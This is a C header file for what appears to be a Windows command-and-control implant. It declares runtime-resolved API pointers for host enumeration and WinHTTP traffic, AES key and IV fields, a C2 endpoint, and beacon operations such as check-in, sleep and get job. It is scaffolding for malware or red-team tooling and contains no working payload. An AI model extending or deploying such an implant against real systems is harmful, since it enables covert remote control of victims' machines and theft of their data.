#pragma once
#include "Common.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _Agent {


	//enumeration apis
	//NTDLL APIS
	t_RtlGetVersion pRtlGetVersion;

	//KERNEL32 APIS
	t_GetComputerNameExA pGetComputerNameExA;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;


	UINT32 AgentID;
	char EndPoint[256];
	LPSTR OperatingSystem;
	LPSTR UserName;
	LPSTR ComputerName;
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* packages;
	



}Agent, * pAgent;



enum Agent_Operations {
	INITIALIZE_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
};


INT init_agent(pAgent agent);
